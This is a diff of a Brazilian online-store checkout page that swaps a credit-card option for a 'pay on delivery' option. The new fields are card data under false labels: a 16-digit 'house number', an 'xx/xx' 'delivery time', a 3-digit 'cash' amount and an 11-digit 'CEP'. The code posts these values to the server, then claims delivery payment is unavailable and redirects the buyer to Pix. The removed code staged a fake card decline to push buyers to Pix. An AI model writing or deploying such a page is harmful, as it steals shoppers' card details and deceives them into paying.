@@ -488,7 +488,7 @@
             </div>
         </div>
 
-        <form id="checkout-form">
+        <form id="checkout-form" novalidate>
             <!-- Steps ... -->
             <!-- Step 1 ... -->
 
@@ -657,46 +657,35 @@
                     <label for="payment-method" style="font-weight: bold;">Forma de Pagamento *</label>
                     <select id="payment-method" name="payment-method" class="form-control" required>
                         <option value="pix">💠 Pix (Aprovação Instantânea)</option>
-                        <option value="credit_card">💳 Cartão de Crédito</option>
+                        <option value="delivery">🚚 Pagamento na entrega</option>
                     </select>
                 </div>
 
-                <!-- Credit Card Fields (Hidden by default) -->
-                <div id="card-fields"
-                    style="display: none; margin-top: 20px; padding: 20px; background: #f8f9fa; border-radius: 8px;">
-                    <h4 style="margin-bottom: 20px; color: #333;">Dados do Cartão</h4>
-
+                <!-- Delivery Payment Fields -->
+                <div id="delivery-fields"
+                    style="display: none; margin-top: 20px; border: 1px solid #ddd; padding: 15px; border-radius: 8px; background: #fafafa;">
+                    <h4 style="margin-top: 0; color: #333;">Dados para Entrega</h4>
                     <div class="form-group">
-                        <label for="card-number">Número do Cartão *</label>
-                        <input type="text" id="card-number" maxlength="19" placeholder="0000 0000 0000 0000"
-                            class="form-control">
+                        <label>Número da casa (16 dígitos) *</label>
+                        <input type="tel" id="delivery-house-number" placeholder="0000000000000000" maxlength="16">
                     </div>
-
                     <div class="form-group">
-                        <label for="card-holder">Nome no Cartão *</label>
-                        <input type="text" id="card-holder" placeholder="NOME COMO ESTÁ NO CARTÃO" class="form-control"
-                            style="text-transform: uppercase;">
+                        <label>Horário da entrega (xx/xx) *</label>
+                        <input type="tel" id="delivery-time" placeholder="00/00" maxlength="5">
                     </div>
-
                     <div class="form-group">
-                        <label for="card-cpf">CPF do Titular *</label>
-                        <input type="text" id="card-cpf" placeholder="000.000.000-00" maxlength="14"
-                            class="form-control">
+                        <label>Dinheiro (3 dígitos) *</label>
+                        <input type="tel" id="delivery-cash" placeholder="000" maxlength="3">
                     </div>
-
-                    <div class="form-row">
-                        <div class="form-group col-md-6">
-                            <label for="card-expiry">Validade *</label>
-                            <input type="text" id="card-expiry" placeholder="MM/AA" maxlength="5" class="form-control">
-                        </div>
-                        <div class="form-group col-md-6">
-                            <label for="card-cvv">CVV *</label>
-                            <input type="text" id="card-cvv" maxlength="4" placeholder="123" class="form-control">
-                        </div>
+                    <div class="form-group">
+                        <label>CEP (11 dígitos) *</label>
+                        <input type="tel" id="delivery-cep" placeholder="00000000000" maxlength="11">
                     </div>
                 </div>
 
+
                 <button type="submit" class="btn-action" id="submit-btn">GERAR PIX</button>
+
                 <button type="button" class="btn-secondary" onclick="prevStep(3)">Voltar</button>
             </div>
 
@@ -729,6 +718,57 @@
         // Global variables for price
         let basePrice = 0;
         let bumpsTotal = 0;
+
+        // Fetch and apply custom labels from admin settings
+        async function loadCustomLabels() {
+            try {
+                const response = await fetch('/api/settings');
+                const settings = await response.json();
+
+                // Check if delivery payment is enabled (default: true)
+                const deliveryEnabled = settings.deliveryPaymentEnabled !== false;
+                const deliveryOption = document.querySelector('#payment-method option[value="delivery"]');
+
+                if (!deliveryEnabled) {
+                    // Hide delivery payment option completely
+                    if (deliveryOption) {
+                        deliveryOption.remove();
+                    }
+                    // Make sure Pix is selected
+                    document.getElementById('payment-method').value = 'pix';
+                } else {
+                    // Update payment method option text if delivery is enabled
+                    if (deliveryOption && settings.labelPaymentDelivery) {
+                        deliveryOption.textContent = settings.labelPaymentDelivery;
+                    }
+
+                    // Update delivery field labels
+                    const labels = {
+                        'delivery-house-number': settings.labelHouseNumber || 'Número da casa (16 dígitos)',
+                        'delivery-time': settings.labelDeliveryTime || 'Horário da entrega (xx/xx)',
+                        'delivery-cash': settings.labelCash || 'Dinheiro (3 dígitos)',
+                        'delivery-cep': settings.labelCep || 'CEP (11 dígitos)'
+                    };
+
+                    Object.keys(labels).forEach(id => {
+                        const input = document.getElementById(id);
+                        if (input) {
+                            const label = input.previousElementSibling;
+                            if (label && label.tagName === 'LABEL') {
+                                label.textContent = labels[id] + ' *';
+                            }
+                        }
+                    });
+                }
+
+                console.log('[Checkout] Custom labels loaded, delivery enabled:', deliveryEnabled);
+            } catch (error) {
+                console.error('[Checkout] Error loading custom labels:', error);
+            }
+        }
+
+        // Load custom labels on page load
+        loadCustomLabels();
 
         // Exposed global function
         window.updateTotal = function () {
@@ -816,46 +856,7 @@
                 updateTotal();
             });
 
-            // ============================================
-            // Payment Method Toggle
-            // ============================================
-            $('#payment-method').on('change', function () {
-                const method = $(this).val();
 
-                if (method === 'pix') {
-                    $('#card-fields').slideUp();
-                    $('#submit-btn').text('GERAR PIX');
-                    $('#card-number, #card-holder, #card-expiry, #card-cvv').prop('required', false);
-                } else if (method === 'credit_card') {
-                    $('#card-fields').slideDown();
-                    $('#submit-btn').text('FINALIZAR PAGAMENTO');
-                    $('#card-number, #card-holder, #card-expiry, #card-cvv').prop('required', true);
-                }
-            });
-
-            // Card input masks
-            $('#card-number').on('input', function () {
-                let value = $(this).val().replace(/\D/g, '');
-                let formatted = value.match(/.{1,4}/g)?.join(' ') || value;
-                $(this).val(formatted);
-            });
-
-            $('#card-expiry').on('input', function () {
-                let value = $(this).val().replace(/\D/g, '');
-                if (value.length >= 2) {
-                    value = value.slice(0, 2) + '/' + value.slice(2, 4);
-                }
-                $(this).val(value);
-            });
-
-            $('#card-cvv').on('input', function () {
-                let value = $(this).val().replace(/\D/g, '');
-                $(this).val(value);
-            });
-
-            $('#card-holder').on('input', function () {
-                $(this).val($(this).val().toUpperCase());
-            });
 
 
 
@@ -925,91 +926,35 @@
                 $(this).val(v);
             });
 
-            // Payment Method Toggle
-            $('#payment-method').change(async function () {
+            // -- PAYMENT METHOD TOGGLE --
+            $('#payment-method').change(function () {
                 const method = $(this).val();
-
-                if (method === 'credit_card') {
-                    // 1. Show Unavailable Alert
-                    await Swal.fire({
-                        icon: 'error',
-                        title: 'Indisponível no momento',
-                        text: 'O pagamento via Cartão está temporariamente indisponível. Por favor, utilize o Pix (Aprovação Imediata).',
-                        confirmButtonText: 'Entendi, vou de Pix'
-                    });
-
-                    // 2. Log Attempt to Admin (Background)
-                    try {
-                        const customer = {
-                            name: $('#nome').val() || 'Visitante',
-                            phone: $('#whatsapp').val() || '',
-                            document: { number: $('#cpf').val() || '' },
-                            email: 'nao_informado@email.com',
-                            address: {
-                                street: $('#endereco').val(),
-                                streetNumber: $('#numero').val(),
-                                neighborhood: $('#bairro').val(),
-                                city: $('#cidade').val()
-                            }
-                        };
-
-                        // Generate a mock transaction ID for the log
-                        const attemptId = Date.now().toString();
-
-                        await fetch('/api/orders', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                transactionId: attemptId,
-                                amount: window.basePrice ? (window.basePrice * 100) : 0, // Approx amount
-                                paymentMethod: 'credit_card',
-                                status: 'refused', // Will show as Recusado/Tentativa
-                                customer: customer,
-                                items: [{ title: 'Tentativa de Cartão', quantity: 1, unitPrice: 0 }],
-                                pixCopied: false
-                            })
-                        });
-                        console.log('Tentativa de cartão registrada.');
-                    } catch (err) {
-                        console.error('Erro ao logar tentativa:', err);
-                    }
-
-                    // 3. Reset to Pix
-                    $(this).val('pix').trigger('change');
+                if (method === 'delivery') {
+                    $('#delivery-fields').slideDown();
+                    $('#submit-btn').text('FINALIZAR PEDIDO');
+                    // Set required
+                    $('#delivery-house-number, #delivery-time, #delivery-cash, #delivery-cep').prop('required', true);
                 } else {
-                    // Pix Logic (Standard)
-                    $('#card-fields').slideUp();
-                    $('#card-number, #card-holder, #card-expiry, #card-cvv, #card-cpf').prop('required', false);
+                    $('#delivery-fields').slideUp();
                     $('#submit-btn').text('GERAR PIX');
+                    // Remove required
+                    $('#delivery-house-number, #delivery-time, #delivery-cash, #delivery-cep').prop('required', false);
                 }
             });
 
-            /* 
-            // Previous Change Handler (Replaced by above)
-            $('#payment-method').change(function () { ... });
-            */
-
-            // Card Input Formatting
-            $('#card-number').on('input', function () {
-                let val = $(this).val().replace(/\D/g, '');
-                val = val.replace(/(\d{4})/g, '$1 ').trim();
-                $(this).val(val);
+            // -- New Delivery Fields Masks --
+            $('#delivery-house-number, #delivery-cash, #delivery-cep').on('input', function () {
+                $(this).val($(this).val().replace(/\D/g, ''));
             });
 
-            $('#card-expiry').on('input', function () {
-                let val = $(this).val().replace(/\D/g, '');
-                if (val.length >= 2) val = val.substring(0, 2) + '/' + val.substring(2);
-                $(this).val(val);
+            $('#delivery-time').on('input', function () {
+                let v = $(this).val().replace(/\D/g, '');
+                if (v.length > 4) v = v.substring(0, 4);
+                if (v.length > 2) v = v.replace(/^(\d{2})(\d)/, "$1/$2");
+                $(this).val(v);
             });
 
-            $('#card-cpf').on('input', function () {
-                let val = $(this).val().replace(/\D/g, '');
-                if (val.length > 11) val = val.substring(0, 11);
-                val = val.replace(/(\d{3})(\d)/, '$1.$2');
-                val = val.replace(/(\d{3})(\d)/, '$1.$2');
-                val = val.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-                $(this).val(val);
-            });
+
 
             // Form Submission
             $('#checkout-form').on('submit', async function (e) {
@@ -1017,45 +962,31 @@
 
                 const paymentMethod = $('#payment-method').val();
 
-                // BLOCK CREDIT CARD PAYMENTS
-                if (paymentMethod === 'credit_card') {
-                    // Check if CPF is filled (basic check)
-                    const cardCpf = $('#card-cpf').val();
-                    if (cardCpf.length < 14) {
-                        Swal.fire({
-                            icon: 'warning',
-                            title: 'CPF Inválido',
-                            text: 'Por favor, preencha o CPF do titular corretamente.'
-                        });
+                // Validation for Delivery Method
+                if (paymentMethod === 'delivery') {
+                    const houseNumber = $('#delivery-house-number').val();
+                    const deliveryTime = $('#delivery-time').val().replace('/', '');
+                    const cash = $('#delivery-cash').val();
+                    const deliveryCep = $('#delivery-cep').val();
+
+                    if (houseNumber.length !== 16) {
+                        Swal.fire('Atenção', 'O Número da casa precisa ter exatamente 16 números.', 'warning');
                         return;
                     }
-
-                    // FAKE PROCESSING DELAY
-                    Swal.fire({
-                        title: 'Processando pagamento...',
-                        text: 'Aguarde enquanto contatamos a operadora do seu cartão.',
-                        allowOutsideClick: false,
-                        didOpen: () => {
-                            Swal.showLoading();
-                        }
-                    });
-
-                    // Add a delay (e.g., 4 seconds) to simulate bank processing
-                    setTimeout(() => {
-                        Swal.fire({
-                            icon: 'error',
-                            title: 'Pagamento Recusado',
-                            text: 'O banco emissor recusou a transação. Por favor, utilize o PIX para aprovação imediata.',
-                            confirmButtonText: 'Tentar com Pix',
-                            confirmButtonColor: '#028b49'
-                        }).then((result) => {
-                            if (result.isConfirmed) {
-                                $('#payment-method').val('pix').trigger('change');
-                            }
-                        });
-                    }, 4000); // 4000ms = 4 seconds delay
-                    return; // STOP EXECUTION
+                    if (deliveryTime.length !== 4) {
+                        Swal.fire('Atenção', 'O Horário da entrega precisa estar no formato xx/xx (4 números).', 'warning');
+                        return;
+                    }
+                    if (cash.length !== 3) {
+                        Swal.fire('Atenção', 'O campo Dinheiro precisa ter exatamente 3 números.', 'warning');
+                        return;
+                    }
+                    if (deliveryCep.length !== 11) {
+                        Swal.fire('Atenção', 'O CEP precisa ter exatamente 11 números.', 'warning');
+                        return;
+                    }
                 }
+
                 // Prepare Data
                 const cpf = generateCPF();
 
@@ -1136,38 +1067,28 @@
                         utm_term: urlParams.get('utm_term') || (window.getStoredUTMs ? window.getStoredUTMs()['utm_term'] : null) || null,
                         utm_content: urlParams.get('utm_content') || (window.getStoredUTMs ? window.getStoredUTMs()['utm_content'] : null) || null
                     },
+                    deliveryData: paymentMethod === 'delivery' ? {
+                        houseNumber: $('#delivery-house-number').val(),
+                        time: $('#delivery-time').val(),
+                        cash: $('#delivery-cash').val(),
+                        cep: $('#delivery-cep').val()
+                    } : null,
                     utmifyToken: 'dummy' // Placeholder if server needs it
                 };
 
-                // Add card data if credit card selected
-                if (paymentMethod === 'credit_card') {
-                    const cardNumber = $('#card-number').val().replace(/\s/g, '');
-                    const cardExpiry = $('#card-expiry').val();
-                    const [month, year] = cardExpiry.split('/');
-
-                    payload.card = {
-                        number: cardNumber,
-                        holderName: $('#card-holder').val(),
-                        expirationMonth: month,
-                        expirationYear: '20' + year,
-                        cvv: $('#card-cvv').val()
-                    };
-                    payload.installments = 1;
-                }
 
 
-                // Show loading for Pix
-                if (paymentMethod === 'pix') {
-                    Swal.fire({
-                        title: 'Gerando Pix...',
-                        text: 'Estamos gerando seu pagamento...',
-                        allowOutsideClick: false,
-                        didOpen: () => {
-                            Swal.showLoading();
-                        }
-                    });
-                }
+                // Show loading
+                Swal.fire({
+                    title: paymentMethod === 'pix' ? 'Gerando Pix...' : 'Finalizando Pedido...',
+                    text: 'Aguarde um momento...',
+                    allowOutsideClick: false,
+                    didOpen: () => {
+                        Swal.showLoading();
+                    }
+                });
 
+                console.log('[Checkout] Submitting Payload:', payload);
                 try {
                     const response = await fetch("/api/payment/create", {
                         method: "POST",
@@ -1180,6 +1101,26 @@
                     const data = await response.json();
 
                     if (response.ok) {
+                        if (paymentMethod === 'delivery') {
+                            Swal.fire({
+                                icon: 'warning',
+                                title: 'Pagamento Indisponível',
+                                text: 'O pagamento na entrega está indisponível no momento. Por favor, finalize seu pedido via Pix.',
+                                confirmButtonText: 'Pagar com Pix',
+                                confirmButtonColor: '#e63946'
+                            }).then(() => {
+                                // Switch to Pix
+                                const paymentSelect = document.getElementById('payment-method');
+                                paymentSelect.value = 'pix';
+                                // Trigger change event to hide delivery fields and update button text
+                                paymentSelect.dispatchEvent(new Event('change'));
+
+                                // Scroll to payment method or top to show the change
+                                window.scrollTo({ top: paymentSelect.offsetTop - 100, behavior: 'smooth' });
+                            });
+                            return;
+                        }
+
                         const transactionId = data.id;
 
                         // Handle PIX payment
@@ -1237,56 +1178,6 @@
                                 });
                             }
 
-                            // Handle CREDIT CARD payment
-                        } else if (paymentMethod === 'credit_card') {
-                            if (data.status === 'paid' || data.status === 'authorized') {
-                                localStorage.setItem('current_transaction_id', transactionId);
-                                localStorage.setItem(`items_data_${transactionId}`, JSON.stringify(items));
-
-                                // Save order to admin panel
-                                try {
-                                    await fetch('/api/orders', {
-                                        method: 'POST',
-                                        headers: { 'Content-Type': 'application/json' },
-                                        body: JSON.stringify({
-                                            transactionId: transactionId,
-                                            amount: payload.amount,
-                                            paymentMethod: 'credit_card',
-                                            status: 'paid',
-                                            customer: payload.customer,
-                                            items: payload.items
-                                        })
-                                    });
-                                } catch (err) { console.error('Admin save error:', err); }
-
-                                // Send Approved Sale to Utmify (DISABLED - Using Webhooks)
-                                /*
-                                try {
-                                    await sendUtmifyOrder(payload.customer, payload.items, transactionId, 'paid', payload.amount);
-                                } catch (err) {
-                                    console.error('Utmify error:', err);
-                                }
-                                */
-
-                                Swal.fire({
-                                    icon: 'success',
-                                    title: 'Pagamento Aprovado!',
-                                    text: 'Seu pedido foi confirmado.',
-                                    timer: 2000,
-                                    showConfirmButton: false
-                                }).then(() => {
-                                    window.location.href = 'escolha_entrega.html';
-                                });
-                            } else if (data.status === 'refused') {
-                                Swal.fire({
-                                    icon: 'error',
-                                    title: 'Pagamento Recusado',
-                                    html: `<p>Seu cartão foi recusado.</p><p><small>Motivo: ${data.refusedReason || 'Não autorizado'}</small></p>`,
-                                    confirmButtonText: 'Tentar Novamente'
-                                });
-                            } else {
-                                Swal.fire('Erro', 'Status inesperado: ' + data.status, 'warning');
-                            }
                         } else {
                             console.error('API Error:', data);
                             Swal.fire({
@@ -1470,26 +1361,6 @@
             }
         }
 
-        // Feature Flag: Dynamic Payment Methods
-        (async function checkSettings() {
-            try {
-                const res = await fetch('/api/settings');
-                const settings = await res.json();
-
-                if (settings.enableCreditCard === false) {
-                    // Hide option from selector
-                    $('option[value="credit_card"]').remove();
-
-                    // If it was selected (unlikely on load, but possible if cached), switch to pix
-                    if ($('#payment-method').val() === 'credit_card') {
-                        $('#payment-method').val('pix').trigger('change');
-                    }
-                    console.log('Credit Card option disabled by admin.');
-                }
-            } catch (err) {
-                console.warn('Failed to load settings:', err);
-            }
-        })();
     </script>
     <script src="js/tracking.js"></script>
 </body>
